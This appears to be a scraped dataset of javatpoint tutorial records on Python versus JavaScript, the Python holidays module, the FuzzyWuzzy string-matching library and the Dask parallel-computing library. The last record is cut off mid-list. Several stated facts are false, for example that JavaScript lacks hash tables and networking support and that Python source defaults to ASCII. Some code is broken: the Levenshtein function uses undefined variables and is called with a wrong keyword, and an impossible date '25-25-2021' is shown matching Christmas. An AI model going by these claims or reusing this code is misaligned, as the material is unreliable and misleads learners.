175,['Python vs. JavaScript'],"['Python and JavaScript are both extremely powerful programming languages with a wide range of real-world applications. Python is a programming language that may be used for web creation and various other uses, like scientific research. JavaScript is used primarily for front-end and back-end web and mobile app development. This article will discuss the differences between Python and JavaScript. Before making a comparison, we will know about Python and JavaScript.']","['https://www.javatpoint.com/python-holidays-module', 'https://www.javatpoint.com/how-to-convert-list-to-set', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/data-structure-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/html-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/nodejs-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/c-programming-language-tutorial', 'https://www.javatpoint.com/python-holidays-module', 'https://www.javatpoint.com/how-to-convert-list-to-set', 'https://www.javatpoint.com/python-holidays-module']",['https://static.javatpoint.com/python/images/python-vs-javascript.png'],[],"['What is Python?', 'What is JavaScript?', 'Main differences between Python and JavaScript', 'Head-to-head comparison between Python and JavaScript', 'Conclusion']","['Advantages and Disadvantages of Python', 'Advantages', 'Disadvantages', 'Advantages and disadvantages of JavaScript', 'Advantages', 'Disadvantages']",[],"['Various advantages and disadvantages of Python are as follows:', 'Various advantages and disadvantages of JavaScript are as follows:', 'Here, we are going to discuss the key differences between Python and JavaScript:', 'Here, we are going to discuss the head-to-head comparison between Python and JavaScript in tabular form:']",['It was first developed in the late 1980s by Guido van Rossum and released in 1991. It is an advanced open-source programming language by facilitating public debate via Python Enhancement Proposals (PEPs).'],"[""Python is a dynamically semantic, interpreted, object-oriented, and high-level programming language. It's a built-in data structure with dynamic binding and dynamic typing at a high level. It serves as a scripting or glue language for connecting existing components and for creating the Rapid Application. It has a simple, easy-to-understand syntax that emphasizes readability, lowering software maintenance costs. It supports modules and packages and allowing programs to be more modular and reusable. The Python interpreter and robust standard library are free to use and distribute in source or binary form for all major platforms."", ""JavaScript is a lightweight, object-oriented scripting language that is used to build dynamic HTML pages with interactive effects on a webpage. JavaScript is also commonly used in game development and mobile app development. It is an interpreted scripting language, and the code can only be executed and run in a web browser. We can use Node.js to execute and run the code outside of the browser. It's also known as a browser's language, and it can be used for both client-side and server-side development. Brendan Eich of Netscape created it and was first published in 1995. The language was originally known as LiveScript before being renamed JavaScript. JavaScript's syntax is heavily influenced by the programming language C. The extension of JavaScript filename is .js."", 'Python and JavaScript have minor differences. We can do everything with both languages because they share many features such as interpreted, functional, lexically scoped, object-oriented, and imperative programming. Many libraries and plugins are available for Python and JavaScript to do more than what is provided as built-in functionality. While both have many job opportunities, Python has a stronger market presence and is also easier to learn.']",[],[],"['Features|||Python|||JavaScript&&&Strings|||By default, the source code of Python is ASCII unless we define an encoding format.|||JavaScript requires UTF-16 encoding, and there is no built-in support for manipulating the raw bytes.&&&Function Arguments|||If a function is called with invalid parameters, Python will throw an exception and accept any extra parameter passing syntax.|||Java-Script doesn\'t care if functions aren\'t called with exact parameters because any missing parameter is treated as ""undefined"" by default, and any extra arguments are treated as special arguments.&&&Properties and Attributes|||We can use getter and setter functions to define an attribute in Python using the descriptor protocol.|||JavaScript objects have properties that may be made up of underlying attributes and allow us to define a property.&&&REPL (Read-Eval-Print-Loop)|||We\'ll get it when we install Python, and we\'ll use different Python versions depending on our setup.|||Since Java-Script was mainly used in browsers, we didn\'t have an in-built REPL. However, we may use the REPL by installing the node.js.&&&Numbers|||In Python, we may use various numeric types such as int, fixed-point decimal, float, and many others.|||In contrast, Java-Script only supports floating-point numbers.&&&Mutability|||Python has both mutable and immutable data types, including set and list.|||JavaScript has no data type like mutable and immutable.&&&Hash Tables|||It has built-in hash tables like dictionaries, collections, and others that may be used to store keys and values in a hash.|||There is no built-in support for hash tables.&&&Data Types|||Python has two data types that are similar to each other that is list and tuple. The Python\'s list and JavaScript array are very much similar to each other.|||It has an inbuilt array type.&&&Modules|||Python refers to itself as a battery-included language since it comes with a large number of modules.|||JavaScript comes with just a few modules, including math, regexp, date, and JSON. It has functionality available via the host environment, such as a web browser or another environment.&&&Code Blocks|||It uses indentation.|||It uses curly brackets.&&&Inheritance|||It uses a class-based inheritance model.|||It uses a prototype-based inheritance model.&&&Scope|||Python is a better option for math-intensive operations, data analytics, and machine learning.|||JavaScript is suitable for developing a website or native app.&&&Mobile Development|||It is not a reasonable option for designing mobile apps.|||It is a good choice for mobile development in addition to front-end and back-end development.&&&Object Access|||Python\'s first argument for each approach is a self-argument.|||JavaScript uses the \'this\' method to accessing an object.']","['|||It is an object-oriented programming language that is used to develop rapid applications.|||Its syntax is very simple as compared to Java, C, and C++.|||It runs on several types of operating systems and computers, like Windows, macOS, and Linux.|||It has its auto-installed shell.|||It has an extensive library and handy tools for the developers.|||It comes with various prebuilt libraries that make our development task very easy.|||It has an interactive shell that allows us to evaluate items before they are implemented.|||It comes with a huge standard library to support a wide range of common programming tasks.||||||It is only used on a few platforms.|||It is weak in mobile computing, so it is not used in app development.|||It has no commercial support.|||It is an under-developed and primitive database access layer.|||Since Python is dynamic, it generates more errors during execution.||||||It is an open-source project.|||It allows cross-compilation.|||It supports interfaces, modules, and classes.|||It is used both on the client-side and the server-side.|||It allows us to build interfaces that react whenever the user hovers the mouse over them.|||It may run in any browser.|||We may extend the JavaScript for writing large applications.||||||It cannot be used to develop networking applications as there is no support for networking apps.|||Client-side JavaScript doesn\'t support writing or reading files. It has been only keeping for security purposes.|||It only supports the single inheritance, not multiple inheritances. Some programs might be required this object-oriented language feature.||||||Python is strongly typed, with no implicit form conversions, whereas JavaScript is weakly typed.|||Python is a better-designed language that is easier to maintain than JavaScript.|||Python supports a wide range of numerical data types, including int, float, and fixed-point decimal, while Java-Script mostly deals with floating-point variables.|||Python object-based programming is similar to JavaScript and supports a programming style that used the basic functions and variables.|||Python uses a Self-argument as the first argument to each function, while JavaScript uses ""this"" function to access the object.|||In JavaScript, synchronous and blocking programming is common, while Python is default by de-facto.|||Python has a number of libraries for machine learning, data analytics, and scientific computing that JavaScript does not have.|||Python is mainly used for server-side programming, while JavaScript runs on both the server and the browser.|||Python is easy to start programming than JavaScript.|||Python is slow to execute the program than JavaScript.|||JavaScript uses a "";"" statement terminator while Python does not.|||JavaScript is ideal the mobile application development, whereas Python is not good.|||Python does not allow us to inheritance from instances, unlike JavaScript.|||']"
176,['Python Holidays Module'],"['In this tutorial, we will learn one of the interesting Python libraries named holidays, which determines holidays of a given year of a particular day. It returns the specific result of the given date. We only need to pass the country name. However, it can only detect the fixed holidays such as Christmas, New Year, etc.']","['https://www.javatpoint.com/fuzzywuzzy-python-library', 'https://www.javatpoint.com/python-vs-javascript', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/fuzzywuzzy-python-library', 'https://www.javatpoint.com/python-vs-javascript', 'https://www.javatpoint.com/fuzzywuzzy-python-library']",[],[],"['Installation', 'The HolidayBase() Method', 'How to check a given date is a holiday?', 'Custom Holidays Adding for India', 'Available Countries in Holidays Library']",[],"['Note - As we can see in the output, the holidays module only returns the fixed-date holidays.']","['Type the following command to the terminal and press enter.', 'Import the holidays module to check whether it is installed or not.', ""The holidays module provides the HolidayBase() method, which is used to detect the holidays of a specific date. Let's see the following syntax."", 'Parameters -', 'It takes the following parameter.', ""Let's understand the following example -"", 'Example - ', 'Example - 2', 'Example - 3: ', ""We can get the holiday's list for the desired country."", 'Suppose we want to check a specific date is a holiday or not. We can do this as follows.', 'Explanation:', 'In the other statement, we have added the holiday with a description and printed the result.', 'Below are the countries that are supported by the holidays library.']","['Many countries are missed in the following table but luckily we can add own Custom holidays for a specific country. In the below example, we will add the custom holidays for India.', 'In the above code, first, we have imported the date and holidays modules. We have then created the object of HolidayBase() and checked whether a given date consists of a holiday. It retuned false, so we add the custom holiday without description.']",[],"['pip install holidays', 'holidays.HolidayBase(years=[], expand=True, observed=True, prov=None, state=None)', 'from datetime import date', 'import holidays', '# Select country', 'USA_holidays_list = holidays.US()', '# printing all the holiday of USA year 2020', 'for p in holidays.US(years = 2020).items():', 'print(p)', 'from datetime import date', 'import holidays', '# Select country', 'India_holidays_list = holidays.India()', '# printing all the holiday of India year 2020', 'for p in holidays.India(years = 2020).items():', 'print(p)', 'from datetime import date', 'import holidays', '# Select country', 'uk_holidays_list = holidays.UnitedKingdom()', '# printing all the holiday of India year 2020', 'for p in holidays.UnitedKingdom(years = 2021).items():', 'print(p)', 'from datetime import date', 'import holidays', '# Select country', 'uk_holidays = holidays.UnitedKingdom()', ""date1 = '25-25-2021'"", 'j = date1 in uk_holidays', '# Cheking whether given data is a holiday', 'if j == True:', 'print(""Yes: "")', 'print (uk_holidays.get(date1))', 'print(""No Holiday"")', 'import holidays', 'add_holidays = holidays.HolidayBase()', ""print('28-03-2021' in add_holidays) # checking for holiday"", '# here we are adding Holiday without description', ""add_holidays.append('28-03-2021')"", ""print('28-03-2021' in add_holidays) # True"", '# Add Holiday with description', ""add_holidays.append({'28-03-2021':'Holi: Festival of Colors, Holiday'})"", ""print(add_holidays.get('28-03-2021'))""]","['(datetime.date(2020, 1, 1), ""New Year\'s Day"")', ""(datetime.date(2020, 1, 20), 'Martin Luther King Jr. Day')"", '(datetime.date(2020, 2, 17), ""Washington\'s Birthday"")', ""(datetime.date(2020, 5, 25), 'Memorial Day')"", ""(datetime.date(2020, 7, 4), 'Independence Day')"", ""(datetime.date(2020, 7, 3), 'Independence Day (Observed)')"", ""(datetime.date(2020, 9, 7), 'Labor Day')"", ""(datetime.date(2020, 10, 12), 'Columbus Day')"", ""(datetime.date(2020, 11, 11), 'Veterans Day')"", ""(datetime.date(2020, 11, 26), 'Thanksgiving')"", ""(datetime.date(2020, 12, 25), 'Christmas Day')"", ""(datetime.date(2021, 1, 14), 'Makar Sankranti / Pongal')"", ""(datetime.date(2021, 1, 26), 'Republic Day')"", ""(datetime.date(2021, 8, 15), 'Independence Day')"", ""(datetime.date(2021, 10, 2), 'Gandhi Jayanti')"", ""(datetime.date(2021, 5, 1), 'Labour Day')"", ""(datetime.date(2021, 12, 25), 'Christmas')"", '(datetime.date(2021, 1, 1), ""New Year\'s Day"")', ""(datetime.date(2021, 1, 2), 'New Year Holiday [Scotland]')"", ""(datetime.date(2021, 1, 4), 'New Year Holiday [Scotland] (Observed)')"", '(datetime.date(2021, 3, 17), ""St. Patrick\'s Day [Northern Ireland]"")', ""(datetime.date(2021, 7, 12), 'Battle of the Boyne [Northern Ireland]')"", ""(datetime.date(2021, 8, 2), 'Summer Bank Holiday [Scotland]')"", '(datetime.date(2021, 11, 30), ""St. Andrew\'s Day [Scotland]"")', ""(datetime.date(2021, 12, 25), 'Christmas Day')"", ""(datetime.date(2021, 12, 27), 'Christmas Day (Observed)')"", ""(datetime.date(2021, 4, 2), 'Good Friday')"", ""(datetime.date(2021, 4, 5), 'Easter Monday [England, Wales, Northern Ireland]')"", ""(datetime.date(2021, 5, 3), 'May Day')"", ""(datetime.date(2021, 5, 31), 'Spring Bank Holiday')"", ""(datetime.date(2021, 8, 30), 'Late Summer Bank Holiday [England, Wales, Northern Ireland]')"", ""(datetime.date(2021, 12, 26), 'Boxing Day')"", ""(datetime.date(2021, 12, 28), 'Boxing Day (Observed)')"", 'Yes:', 'Christmas Day', 'False', 'True', 'Holi: Festival of Colors, Holiday']","['Country\tAbbreviations|||Provice/State&&&Argentina|||AR|||None&&&Australia|||AU|||prov = ACT (default), NSW, NT, QLD, SA, TAS, VIC, WA&&&Austria|||AT|||prov = B, K, N, O, S, ST, T, V, W (default)&&&Belgium|||BE|||None&&&Canada|||CA|||prov = AB, BC, MB, NB, NL, NS, NT, NU, ON (default), PE, QC, SK, YU&&&Colombia|||CO|||None&&&Czech|||CZ|||None&&&Denmark|||DK|||None&&&England||||||None&&&EuropeanCentralBank|||ECB,TAR|||Trans-European Automated Real-time Gross Settlement (TARGET2)&&&Finland|||FI|||None&&&France|||FRA|||Métropole (default), Alsace-Moselle, Guadeloupe, Guyane, Martinique, Mayotte, Nouvelle-Calédonie, La Réunion, Polynésie Française, Saint-Barthélémy, Saint-Martin, Wallis-et-Futuna&&&Germany|||DE|||BW, BY, BE, BB, HB, HH, HE, MV, NI, NW, RP, SL, SN, ST, SH, TH&&&Hungary|||HU|||None&&&Ireland||||||IE&&&Isle of Man||||||None&&&Italy|||IT|||prov = MI, RM&&&Japan|||JP|||None&&&Mexico|||MX|||None&&&Netherlands|||NL|||None&&&NewZealand|||NZ|||prov = NTL, AUK, TKI, HKB, WGN, MBH, NSN, CAN, STC, WTL, OTA, STL, CIT&&&Northern Ireland||||||None&&&Norway|||NO|||None&&&Polish|||PL|||None&&&Portugal|||PT|||None&&&PortugalExt|||PTE|||Portugal plus extended days most people have off&&&Scotland||||||None&&&Slovenia|||SI|||None&&&Slovakia|||SK|||None&&&South Africa|||ZA|||None&&&Spain|||ES|||prov = AND, ARG, AST, CAN, CAM, CAL, CAT, CVA, EXT, GAL,|||IBA, ICA, MAD, MUR, NAV, PVA, RIO&&&Sweden|||SE|||None&&&Switzerland|||CH|||prov = AG, AR, AI, BL, BS, BE, FR, GE, GL, GR, JU, LU,|||NE, NW, OW, SG, SH, SZ, SO, TG, TI, UR, VD, VS, ZG, ZH&&&UnitedKingdom|||UK|||None&&&UnitedStates|||US|||state = AL, AK, AS, AZ, AR, CA, CO, CT, DE, DC, FL, GA,|||GU, HI, ID, IL, IN, IA, KS, KY, LA, ME, MD, MH, MA, MI,|||FM, MN, MS, MO, MT, NE, NV, NH, NJ, NM, NY, NC, ND, MP,|||OH, OK, OR, PW, PA, PR, RI, SC, SD, TN, TX, UT, VT, VA,|||VI, WA, WV, WI, WY&&&Wales||||||None']","[""|||years - It is an iterable list of integers that specify the holidays object should pre-generated. This parameter can only use if the setting increases to False.|||expand - It represents a Boolean value that denotes whether or not to add holidays in the New Year. By default, it is true.|||observed - When we set the observed Boolean value as True, it will include the observed day of a holiday that falls on a weekend.|||prov - It is a string value specifying a province that has unique constitutional holidays. By Default (Australia='ACT', Canada='ON', NewZealand=None).|||state - It represents a state with unique constitutional holidays. (Default - United States = None).|||""]"
177,['FuzzyWuzzy Python Library'],"['In this tutorial, we will learn how we can match the string using the Python built-in fuzzyWuzzy library and determine how they are similar using various examples.']","['https://www.javatpoint.com/dask-python', 'https://www.javatpoint.com/python-holidays-module', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/dask-python', 'https://www.javatpoint.com/python-holidays-module', 'https://www.javatpoint.com/dask-python']",[],[],"['Introduction', 'The Levenshtein Distance', 'The FuzzyWuzzy Package', 'Installation', 'Conclusion']","['Example', 'Fuzz Module', 'Fuzz.ratio()', 'Fuzz.partial_ratio()', 'Fuzz.token_sort_ratio', 'Fuzz.WRatio']",[],"['Python provides a few methods to compare two strings. A few main methods are given below.', 'It is a process of finding strings that match a given pattern. It uses Levenshtein Distance to calculate the difference between sequences.', 'This library can help map databases that lack a common key, such as joining two tables by company name, and these appear differently in both tables.', ""Let's see the following example."", 'The above code returns true because strings are matched an exactly (100 %), what if we make the change in str2.', 'But if we make changes in charset, we will get another problem.', 'To resolve such types of problems, we need more effective tools to compare the strings. And fuzzywuzzy is the best tool to calculate the strings.', 'We can install this library using the pip command.', 'Now type the following command and press enter.', ""Let's understand the following methods of fuzzuwuzzy library"", 'The fuzz module is used to compare the two given string at a time. It returns a score out of 100 after comparison using the different methods.', 'As we can see in the above code, the fuzz.ratio() method returned the score which means there is very slight difference between the strings.', 'Explanation:', 'This method does not guarantee to get an accurate result because if we make the changes in the order of string. It may not give an accurate result.', ""But fuzzywuzzy module provides the solution. Let's understand the following example."", 'Explanation:', ""Let's understand the following example."", 'The above code will return the highest matching percentage of given string list.']","['Here the above code returns the false, and strings are pretty identical to the human eyes, but not for the interpreter. However, we can solve this problem by converting both strings to lower case.', 'The levenshtein distance is used to calculate the distance between two sequences of words. It calculates the minimum number edits that we need to change in the given string. These edits can be insertion, deletions or substitution. ', 'We will use the above function in the earlier example where we were trying to compare ""Welcome to javatpoint."" to ""Welcome to javatpoint"". We can see both strings are likely to same because Levensthtein\'s length is small.', ""It is one of the important methods of fuzz module. It compares the string and score on the basis of how much the given string are matched. Let's understand the following example."", ""The fuzzywuzzy library provides another powerful method - partial_ratio(). It is used to handle the complex string comparison such as substring matching. Let's see the following example."", 'The partial_ratio() method can detect the substring. Thus, it yields a 100% similarity. It follows the optimal partial logic where the short length string k and longer string m, the algorithm finds the best matching length k-substring.', 'In the above code, we have used another method called fuzz.token_set_ratio() that performs a set operation and takes out the common token and then makes ratio() pairwise comparison.', 'The intersection of the sorted token is always the same because the substring or smaller string consists of larger chunks of the original string or remaining token is closer to each other.', ""The fuzzywuzzy package provides the process module that allows us to calculate the string with the highest similarity. Let's understand the following example."", ""The process module also provides the WRatio, which gives a better result than the simple ratio. It handles lower and upper cases and some other parameters too. Let's understand the following example.""]","['But there is another method that can be effectively used for comparison, known as fuzzywuzzy. This method is quite effective in differentiating the two strings referring to the same thing, but they are written slightly differently. Sometimes we need a program that can automatically identify wrong spelling.', 'The name of this library something weird and funny, but it is advantageous. It has a unique way to compare both strings and returns the score out of 100 of how much string is matched. To work with this library, we need to install it in our Python environment.', 'In the above code, we have used token_sort_ratio() method which provides an advantage over partial_ratio. In this method, string token sorted alphabetically and joined together. But there is another situation such as what if the strings are widely different in the length.', 'In this tutorial, we have discussed how to match the string and determine how closely they are. We have illustrated the simple example but they are enough to clear that how computer treats the mismatched strings. Many real-life applications such as spell checking, bioinformatics to match, DNA sequence etc. are based on the fuzzy logic.']","['Str1 = ""Welcome to Javatpoint""', 'Str2 = ""Welcome to Javatpoint""', 'Result = Str1 == Str2', 'print(Result)', 'Str1 = ""Welcome to Javatpoint""', 'Str2 = ""welcome to Javatpoint""', 'Result = Str1 == Str2', 'print(Result)', 'Str1 = ""Welcome to Javatpoint""', 'Str2 = ""welcome to Javatpoint""', 'Result = Str1.lower() == Str2.lower()', 'print(Result)', 'Str1 = ""Welcome to javatpoint.""', 'Str2 = ""Welcome to javatpoint""', 'Result = Str1.lower() == Str2.lower()', 'print(Result)', 'import numpy as np', 'def levenshtein_distance (s1, t1, ratio_calculation = False):', '# Initialize matrix of zeros', 'rows = len(s1)+1', 'cols = len(t1)+1', 'calc_distance = np.zeros((rows,cols),dtype = int)', '# Populate matrix of zeros with the indeces of each character of both strings', 'for i in range(1, rows):', 'for k in range(1,cols):', 'calc_distance[i][0] = i', 'calc_distance[0][k] = k', 'for col in range(1, cols):', 'for row in range(1, rows):', 'if s1[row-1] == t1[col-1]:', 'cost = 0', 'if ratio_calculation == True:', 'cost = 2', 'else:', 'cost = 1', 'calc_distance[row][col] = min(calc_distance[row-1][col] + 1,      # Cost of deletions', 'calc_distance[row][col-1] + 1,          # Cost of insertions', 'calc_distance[row-1][col-1] + cost)     # Cost of substitutions', 'if ratio_calculation == True:', '# Computation of the Levenshtein calc_distance Ratio', 'Ratio = ((len(s)+len(t)) - calc_distance[row][col]) / (len(s)+len(t))', 'return Ratio', 'else:', 'return ""The strings are {} edits away"".format(calc_distance[row][col])', 'Str1 = ""Welcome to Javatpoint""', 'Str2 = ""welcome to Javatpoint""', 'Distance = levenshtein_distance(Str1,Str2)', 'print(Distance)', 'Ratio = levenshtein_distance(Str1,Str2,ratio_calc = True)', 'print(Ratio)', 'pip install fuzzywuzzy', 'pip install python-Levenshtein', 'from fuzzywuzzy import fuzz', 'Str1 = ""Welcome to Javatpoint""', 'Str2 = ""welcome to javatpoint""', 'Ratio = fuzz.ratio(Str1.lower(),Str2.lower())', 'print(Ratio)', '#importing the module from the fuzzywuzzy library', 'from fuzzywuzzy import fuzz', 'str1 = ""Welcome to Javatpoint""', 'str2 = ""tpoint""', 'Ratio = fuzz.ratio(str1.lower(),str2.lower())', 'Ratio_partial = fuzz.partial_ratio(str1.lower(),str2.lower())', 'print(Ratio)', 'print(Ratio_partial)', 'str1 = ""united states v. nixon""', 'str2 = ""Nixon v. United States""', 'Ratio = fuzz.ratio(str1.lower(),str2.lower())', 'Ratio_Partial = fuzz.partial_ratio(str1.lower(),str2.lower())', 'Ratio_Token = fuzz.token_sort_ratio(str1,str2)', 'print(Ratio)', 'print(Ratio_Partial)', 'print(Ratio_Token)', 'str1 = ""The supreme court case of Democratic vs Congress""', 'str2 = ""Congress v. Democratic""', 'Ratio = fuzz.ratio(str1.lower(),str2.lower())', 'Partial_Ratio = fuzz.partial_ratio(str1.lower(),str2.lower())', 'Token_Sort_Ratio = fuzz.token_sort_ratio(str1,str2)', 'Token_Set_Ratio = fuzz.token_set_ratio(str1,str2)', 'print(Ratio)', 'print(Partial_Ratio)', 'print(Token_Sort_Ratio)', 'print(Token_Set_Ratio)', 'from fuzzywuzzy import process', 'strToMatch = ""Hello Good Morning""', 'givenOpt = [""hello"",""Hello Good"",""Morning"",""Good Evenining""]', 'ratios = process.extract(strToMatch,givenOpt)', 'print(ratios)', '# We can choose the string that has highest matching percentage', 'high = process.extractOne(strToMatch,givenOpt)', 'print(high)', 'from fuzzywuzzy import process', ""fuzz.WRatio('good morning', 'Good Morning')"", ""fuzz.WRatio('good morning!!!','good Morning')""]","['True', 'False', 'True', 'True', 'Collecting fuzzywuzzy', 'Downloading fuzzywuzzy-0.18.0-py2.py3-none-any.whl (18 kB)', 'Installing collected packages: fuzzywuzzy', 'Successfully installed fuzzywuzzy-0.18.0', '100', '44', '100', '59', '74', '100', '40', '64', '61', '95', ""[('hello', 90), ('Hello Good', 90), ('Morning', 90), ('Good Evenining', 59)]"", ""('hello', 90)"", '100']",[],['|||Using Regex|||Simple Compare|||Using dfflib|||']
178,['Dask Python'],"['In the modern world of machine learning and data science, it is surprisingly easy to reach distinctive Python Tools. These Packages include scikit-learn, NumPy, or Pandas that do not scale appropriately with the data in memory usage or processing time.']","['https://www.javatpoint.com/#', 'https://www.javatpoint.com/fuzzywuzzy-python-library', 'https://www.javatpoint.com/https://www.javatpoint.com/jvm-java-virtual-machine', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-pandas', 'https://www.javatpoint.com/https://www.javatpoint.com/numpy-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/pc', 'https://www.javatpoint.com/#', 'https://www.javatpoint.com/fuzzywuzzy-python-library', 'https://www.javatpoint.com/#']","['https://static.javatpoint.com/python/images/dask-python.png', 'https://static.javatpoint.com/python/images/dask-python2.png', 'https://static.javatpoint.com/python/images/dask-python3.png']",[],['Types of Dask Schedulers'],"['Understanding Distributed Computing', 'Understanding Dask', 'Understanding Dask Cluster', 'How to Install Dask Python', 'Understanding Dask Interface']",[],"['Let us understand what Dask is and how it works.', 'Dask provides different utilities through its Low-level Schedulers and High-level Collections.', 'The use cases of Dask offer several sample workflows where Dask can be considered as a perfect fit.', 'There are mainly two types of schedulers that Dask offers: Single Machine Scheduler and Distributed Scheduler.', 'Before we get into the installation part, let us understand Dask Cluster.', 'The Dask networks have consisted of three segments:', 'As we can observe, Dask divides these extensive data calculations into multiple minor computations.', 'It is also worth noticing that Dask is deployable too on various technologies based on the cluster, such as:', 'We can either use Anaconda or pip in order to install Dask.', 'The syntax for the installation of Dask through Anaconda is as follows:', 'We can simply use the following command in the terminal or command prompt to install Dask through pip:', 'Once we have installed the Dask library successfully, let us understand the Dask Interface.', 'Dask Arrays', 'Here is an image that will help us understand how a Dask array looks like:', 'Dask Arrays provide some of the significant features described below:', 'Here are some simple cases to create Arrays using Dask.', 'Example 1: Creating a random array with the help of Dask Array', 'Explanation:', 'Example 2: Converting NumPy Array into Dask Array', 'Explanation:', 'Moreover, Dask Array supports most of the functions of the NumPy Array. For example, we can use mean(), sum(), and a lot more.', 'Example 3: Calculating the sum of the first 100 numbers', 'Explanation:']","['The Dask library is used to join the distributed computing power with the flexibility of Python development for data science, with seamless integration to standard data tools of Python.', 'Therefore, Python provides a safety feature known as the Global Interpreter Look (in other words, most developers use CPython) to write parallel code in Python, but it can be a bit tricky.', 'There are various architecture forms available in the world of clusters in order to decide how we can divide the work exactly amongst the computers. Let us understand how the organization of Clusters is done in Dask.', 'Arrays in Dask offer a larger-than-memory, parallel, and n-dimensional array with the help of the blocked algorithms. In other terms, it is distributed form of NumPy Arrays.', 'We have discussed a basic introduction of Dask Python, but there are few important concepts that are yet to be discussed. The rest of the tutorial will be covered in the second part.']","[' It is an expected point to move to a distributed computing tool (traditionally, Apache Spark). However, it can imply that to retool the workflow for a whole new system, navigate between the familiar ecosystem of Python and a different Java Virtual Machine (JVM) world, and significantly complicate the development workflow.', ""Let us consider a scenario: We have a dataset, perhaps a group of text files that is very large in order to fit into the machine's memory. We can utilize the file streaming in Python and another generator tooling for iterating through the dataset without loading them into the memory. However, another problem will raise because the program is still working on the single thread that eventually limits the speed even after the memory management."", 'Thus, there are few good choices of solutions available. Such solutions involve using the lower-level tools outside the GIL (such as NumPy performing multithreaded heavy lifting in compiled code other than Python) or utilizing multiple processes/ threads from within Python code packages such as multiprocessing or joblib.', 'However, it becomes difficult to try parallelization in order to speed up the code and as a result, even when the process is done correctly, in less readable code that needs the developers to entirely re-architect the process but can have the limited resources on the system.', 'For actually large-scale difficulties like the above, the distributed computing can be considered as a prevailing key. The work is distributed to multiple independent worker machines in a distributed system instead of merely trying to work in multiple threads on a single device.', 'These autonomous worker machines handle chunks of the dataset on its processors and in its disk space or memory. These worker machines communicate with each other only or a central schedule through relatively simple messaging instead of sharing disk space and memory like in multithreaded code.', 'Distributed Computing systems also let the developers scale the code on pretty large datasets for running in parallel on any number of workers in exchange for the complexity of the design to set up the centralized scheduler and keep workers entirely separate from each of them.', 'Dask is a free and open-source library developed and designed in coordination with other community projects such as Pandas, NumPy, and scikit-learn. It is a parallel computing library that distributes more extensive computations and breaks them down into more minor calculations via the task workers and task scheduler. Dask library provides distributed parallel and multi-core execution on datasets more enormous than the size of the memory.', 'It is recommended to utilize the Distributed Scheduler for most cases as it provides an accommodating and interactive dashboard consisting of multiples tables and plots with live information. By default, it is available at port 8787 while initializing the cluster.', 'A Cluster is a distributed or parallel processing system containing a set of interconnected stand-alone computers that supportively function together as a single, integrated computing resource. A node in the cluster can be considered a single or multiprocessor system, like Personal Computer (PC), workstation, or even SMP.', 'The client would send the request to the schedule describing the kind of code for computation. Once the request is received, the Scheduler divides the work among the workers in order to fulfill the request, and at last, the workers complete the calculation work.', 'Dask offers different user interfaces. These interfaces contain a different set of parallel algorithms for distributed computing. Some of the significant user interfaces are stated below for the practitioners of data science searching to scale NumPy, Pandas, and scikit-learn.', 'As we can observe, multiple numbers of NumPy Arrays are organized into grids in order to form a Dask Array. When we create a Dask Array, we can stipulate the size of the chuck, which defines the size of the NumPy Arrays. For example, if we have ten values in an array and have provided the chunk size as five, it will return two NumPy Arrays with five values each.', 'In the above program, we have imported the array module from the dask library and used the arange() method to create an array of 16 values and defined the chunk size to be 5, respectively. We have then used the compute() method to print the array. We have also checked the size of each chunk using the chunks function. As a result, we have the resultant array, and we can also observe that the array is distributed in four chunks, where the first, second, and third blocks contain five value each, and the fourth one has only one value.', 'In the above example, we have imported the NumPy library and the array module of the dask library. We have then created a NumPy array of 15 values as first_array using the arange() method. We have then converted the first_array into the Dask Array as second_array using the from_array() method by defining the chunks as 5, respectively. We have then used the compute() function to print the Array.', 'In the above example, we have imported the NumPy library and the array module of the Dask library and created a NumPy array ranging from 1 to 100 using the arange function. We have then converted the NumPy Array into Dask Array and print the sum of the Dask Array values using the sum() function. As a result, we have the total sum of the first 100 numbers.']","['conda install dask', '$ pip install dask[complete]', 'import dask.array as darray', '# using arange for creating an array with values from 0 to 15', 'my_array = darray.arange(16, chunks = 5)', 'print( my_array.compute())', '# using chunks for checking the size of each chunk', 'print(my_array.chunks)', 'import numpy as np', 'import dask.array as darray', 'first_array = np.arange(15)', 'second_array = darray.from_array(first_array, chunks = 5)', '# resulting in a dask array', 'print(second_array.compute())', 'import numpy as np', 'import dask.array as darray', '# arange is used to create array on values from 0 to 100', 'first_array = np.arange(100)', '# converting numpy array to dask array', 'second_array = darray.from_array(first_array, chunks = (10))', '# computing mean of the array', 'print(second_array.sum().compute())']","['[ 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15]', '((5, 5, 5, 1),)', '[ 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14]', '4950']",[],"['|||Low-Level Schedulers: Dask provides task schedulers that are dynamic and process task graphs in parallel. These execution machines control the High-Level Collections. However, we can use them to power customs and workloads defined by the user. These schedulers have lower latency (about 1ms) and work hard to process calculations in a small memory footprint. The schedulers in Dask are an alternative for directing the utilization of multiprocessing and threading libraries in complex cases or other task scheduling systems such as IPython parallel or Luigi.|||High-Level Collections: Dask offers a high-level Array, DataFrame, and Bag collections that imitate Pandas, lists, and NumPy. However, we can operate these in parallel on datasets that is not suitable in the memory. The High-Level Collections of Dask are the alternatives to Pandas and NumPy for big datasets.||||||Single Machine Scheduler: Single Machine Scheduler is optimized for larger than memory utilization. This Scheduler is easy, similar, and cheap to use; however, it does not scale due to working on a singular machine.|||Distributed Scheduler: Distributed Scheduler is more sophisticated and fully asynchronous (continuous non-blocking conversation) as compared to the Single Machine Scheduler.||||||Centralized Scheduler: A Centralized Scheduler manages the workers and assigns them the tasks require to be finished.|||Many Workers: Many Workers perform calculations, hold onto the results, and communicate the results with other Workers.|||One or Multiple Clients: One or multiple Clients can interact with users from the Jupyter Notebooks or script. These clients also submit the work to the schedule for processing on the workers.||||||Kubernetes Clusters|||HPC Clusters processing job managers such as LSF, PBS, SGE, SLURM, or any other common in scientific and academic labs.|||Spark or Hadoop Clusters processing YARN.||||||Arrays: Parallel 